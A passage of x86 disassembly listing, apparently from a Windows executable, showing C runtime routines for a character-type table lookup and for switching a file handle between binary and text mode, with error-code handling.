  40730c:	8d 48 01             	lea    0x1(%eax),%ecx
  40730f:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  407315:	77 0c                	ja     0x407323
  407317:	8b 0d 58 96 40 00    	mov    0x409658,%ecx
  40731d:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  407321:	eb 52                	jmp    0x407375
  407323:	8b c8                	mov    %eax,%ecx
  407325:	56                   	push   %esi
  407326:	8b 35 58 96 40 00    	mov    0x409658,%esi
  40732c:	c1 f9 08             	sar    $0x8,%ecx
  40732f:	0f b6 d1             	movzbl %cl,%edx
  407332:	f6 44 56 01 80       	testb  $0x80,0x1(%esi,%edx,2)
  407337:	5e                   	pop    %esi
  407338:	74 0e                	je     0x407348
  40733a:	80 65 fe 00          	andb   $0x0,-0x2(%ebp)
  40733e:	88 4d fc             	mov    %cl,-0x4(%ebp)
  407341:	88 45 fd             	mov    %al,-0x3(%ebp)
  407344:	6a 02                	push   $0x2
  407346:	eb 09                	jmp    0x407351
  407348:	80 65 fd 00          	andb   $0x0,-0x3(%ebp)
  40734c:	88 45 fc             	mov    %al,-0x4(%ebp)
  40734f:	6a 01                	push   $0x1
  407351:	58                   	pop    %eax
  407352:	8d 4d 0a             	lea    0xa(%ebp),%ecx
  407355:	6a 01                	push   $0x1
  407357:	6a 00                	push   $0x0
  407359:	6a 00                	push   $0x0
  40735b:	51                   	push   %ecx
  40735c:	50                   	push   %eax
  40735d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407360:	50                   	push   %eax
  407361:	6a 01                	push   $0x1
  407363:	e8 88 fd ff ff       	call   0x4070f0
  407368:	83 c4 1c             	add    $0x1c,%esp
  40736b:	85 c0                	test   %eax,%eax
  40736d:	75 02                	jne    0x407371
  40736f:	c9                   	leave
  407370:	c3                   	ret
  407371:	0f b7 45 0a          	movzwl 0xa(%ebp),%eax
  407375:	23 45 0c             	and    0xc(%ebp),%eax
  407378:	c9                   	leave
  407379:	c3                   	ret
  40737a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40737e:	56                   	push   %esi
  40737f:	3b 05 e0 c2 40 00    	cmp    0x40c2e0,%eax
  407385:	73 5a                	jae    0x4073e1
  407387:	8b c8                	mov    %eax,%ecx
  407389:	83 e0 1f             	and    $0x1f,%eax
  40738c:	c1 f9 05             	sar    $0x5,%ecx
  40738f:	8b 0c 8d e0 c1 40 00 	mov    0x40c1e0(,%ecx,4),%ecx
  407396:	8d 54 c1 04          	lea    0x4(%ecx,%eax,8),%edx
  40739a:	8a 4c c1 04          	mov    0x4(%ecx,%eax,8),%cl
  40739e:	f6 c1 01             	test   $0x1,%cl
  4073a1:	74 3e                	je     0x4073e1
  4073a3:	8a c1                	mov    %cl,%al
  4073a5:	be 00 80 00 00       	mov    $0x8000,%esi
  4073aa:	25 80 00 00 00       	and    $0x80,%eax
  4073af:	39 74 24 0c          	cmp    %esi,0xc(%esp)
  4073b3:	75 05                	jne    0x4073ba
  4073b5:	80 e1 7f             	and    $0x7f,%cl
  4073b8:	eb 0d                	jmp    0x4073c7
  4073ba:	81 7c 24 0c 00 40 00 	cmpl   $0x4000,0xc(%esp)
  4073c1:	00 
  4073c2:	75 11                	jne    0x4073d5
  4073c4:	80 c9 80             	or     $0x80,%cl
  4073c7:	f7 d8                	neg    %eax
  4073c9:	1b c0                	sbb    %eax,%eax
  4073cb:	88 0a                	mov    %cl,(%edx)
  4073cd:	66 25 00 c0          	and    $0xc000,%ax
  4073d1:	03 c6                	add    %esi,%eax
  4073d3:	5e                   	pop    %esi
  4073d4:	c3                   	ret
  4073d5:	c7 05 e4 bd 40 00 16 	movl   $0x16,0x40bde4
  4073dc:	00 00 00 
  4073df:	eb 0a                	jmp    0x4073eb
  4073e1:	c7 05 e4 bd 40 00 09 	movl   $0x9,0x40bde4
  4073e8:	00 00 00 
  4073eb:	83 c8 ff             	or     $0xffffffff,%eax
  4073ee:	5e                   	pop    %esi
  4073ef:	c3                   	ret
  4073f0:	ff 25 a8 80 40 00    	jmp    *0x4080a8
